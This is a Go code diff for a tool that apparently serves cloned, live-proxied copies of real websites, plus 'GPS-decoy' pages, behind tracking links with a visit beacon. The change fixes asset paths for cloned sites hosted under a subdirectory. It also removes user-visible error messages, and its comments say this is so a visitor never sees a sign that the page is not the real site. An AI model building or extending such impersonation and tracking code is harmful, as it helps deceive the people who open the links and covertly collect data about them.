@@ -289,7 +289,7 @@ func (h *Handler) GPSPage(w http.ResponseWriter, r *http.Request) {
 	noStore(w)
 
 	if link.Config.CloneURL != "" {
-		h.render(w, "mirror_loader.html", mirrorLoaderData("/g/"+link.Slug, eventID, originOf(link.Config.CloneURL)))
+		h.render(w, "mirror_loader.html", mirrorLoaderData("/g/"+link.Slug, eventID, originOf(link.Config.CloneURL), basePathOf(link.Config.CloneURL)))
 		return
 	}
 
@@ -327,8 +327,22 @@ func (h *Handler) GPSPageView(w http.ResponseWriter, r *http.Request) {
 		err = mirror.ServeRaw(w, r, link.Config.CloneURL, beacon)
 	}
 	if err != nil {
+		// Same reasoning as ClonePageView's fallback: never show a visitor
+		// anything that hints the live proxy failed. Fall back to the same
+		// built-in decoy theme GPSPage renders when no CloneURL is set at
+		// all, rather than a bare error response.
 		log.Printf("gps clone view: mirror %q: %v", link.Config.CloneURL, err)
-		http.Error(w, "could not load page", http.StatusBadGateway)
+		theme := link.Config.Theme
+		if theme == "" {
+			theme = "cats"
+		}
+		h.render(w, "decoy.html", map[string]any{
+			"Slug":     link.Slug,
+			"EventID":  eventID,
+			"Theme":    theme,
+			"Redirect": link.Config.Destination,
+			"Label":    link.Label,
+		})
 	}
 }
 
@@ -507,7 +521,7 @@ func (h *Handler) ClonePage(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	h.render(w, "mirror_loader.html", mirrorLoaderData("/p/"+link.Slug, eventID, originOf(dest)))
+	h.render(w, "mirror_loader.html", mirrorLoaderData("/p/"+link.Slug, eventID, originOf(dest), basePathOf(dest)))
 }
 
 // ClonePageView handles GET /p/{slug}/view: serves the actual live-proxied
@@ -551,6 +565,12 @@ func (h *Handler) ClonePageView(w http.ResponseWriter, r *http.Request) {
 		err = mirror.ServeRaw(w, r, dest, beacon)
 	}
 	if err != nil {
+		// Diagnostic detail goes to the server log for the admin only — a
+		// visitor hitting this link must never see anything suggesting a
+		// proxy/mirror failed behind the scenes (that's a dead giveaway
+		// this isn't the real site). Fall back to the same card shown when
+		// no destination is configured at all: title/image/description and
+		// a plain "Continue to site" link, nothing that hints at an error.
 		log.Printf("clone view: mirror %q: %v", dest, err)
 		h.render(w, "clone.html", map[string]any{
 			"Slug":        link.Slug,
@@ -559,7 +579,6 @@ func (h *Handler) ClonePageView(w http.ResponseWriter, r *http.Request) {
 			"Image":       link.Config.Image,
 			"Destination": dest,
 			"BaseURL":     h.Cfg.BaseURL,
-			"Error":       "Could not load a live copy of the target page right now.",
 		})
 	}
 }
@@ -596,9 +615,10 @@ func (h *Handler) serveMirrorSW(w http.ResponseWriter) {
 // registration bounce page (mirror_loader.html) shared by Clone/Preview and
 // GPS-decoy clone links. prefix is the link's own route prefix, e.g.
 // "/p/abc123" or "/g/abc123".
-func mirrorLoaderData(prefix string, eventID int64, targetOrigin string) map[string]any {
+func mirrorLoaderData(prefix string, eventID int64, targetOrigin, targetBasePath string) map[string]any {
 	relay := prefix + "/r"
-	swURL := prefix + "/sw.js?origin=" + url.QueryEscape(targetOrigin) + "&relay=" + url.QueryEscape(relay)
+	swURL := prefix + "/sw.js?origin=" + url.QueryEscape(targetOrigin) +
+		"&base=" + url.QueryEscape(targetBasePath) + "&relay=" + url.QueryEscape(relay)
 	viewURL := fmt.Sprintf("%s/view?eid=%d", prefix, eventID)
 	return map[string]any{
 		"SWURL":     swURL,
@@ -619,6 +639,35 @@ func originOf(rawURL string) string {
 		return ""
 	}
 	return u.Scheme + "://" + u.Host
+}
+
+// basePathOf returns the directory portion of rawURL's path (no trailing
+// slash, "" for root) — what the mirror service worker needs on top of
+// originOf to correctly reconstruct a *page-relative* reference (e.g.
+// src="./assets/x.js" or src="assets/x.js") from a target site that isn't
+// hosted at its origin's root, such as a GitHub Pages project site
+// (https://user.github.io/project/). The browser resolves that kind of
+// reference against the *current document's own directory*, which on our
+// proxied page is always this link's own prefix (e.g. "/p/abc123/"); the
+// service worker strips that prefix back off and needs this target
+// directory to put in its place, or it incorrectly reconstructs the real
+// URL as if the target were hosted at its origin root (see the "beacon"
+// GitHub Pages bug this was written to fix — assets 404'd because
+// "/assets/x.js" was requested instead of "/project/assets/x.js"). A
+// genuinely root-relative reference (href="/about") never gets this prefix
+// applied by the browser in the first place, so it doesn't need this value.
+func basePathOf(rawURL string) string {
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return ""
+	}
+	dir := u.Path
+	if i := strings.LastIndex(dir, "/"); i >= 0 {
+		dir = dir[:i]
+	} else {
+		dir = ""
+	}
+	return dir
 }
 
 // ClonePageResource handles /p/{slug}/r (any HTTP method): relays a single
